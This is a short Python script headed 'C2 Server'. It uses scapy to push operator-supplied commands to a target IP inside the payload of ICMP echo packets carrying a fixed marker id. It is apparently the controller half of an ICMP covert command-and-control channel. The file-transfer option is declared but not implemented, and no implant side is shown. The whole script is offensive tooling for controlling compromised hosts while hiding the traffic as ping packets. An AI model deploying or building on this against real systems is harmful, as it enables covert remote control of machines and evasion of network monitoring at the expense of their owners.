#!/usr/bin/env python3

# C2 Server

import argparse
from scapy.all import *

parser = argparse.ArgumentParser()
parser.add_argument("ip", help="IP address")
parser.add_argument("-c", "--command", help="execute command")
parser.add_argument("-t", "--transfer", help="transfer files")

args = parser.parse_args()

def send_cmd(cmd):
	packet = IP(dst=args.ip)/ICMP(id=0x6341, seq=0x1)/cmd
	send(packet)
	print("done")

send_cmd(args.command)
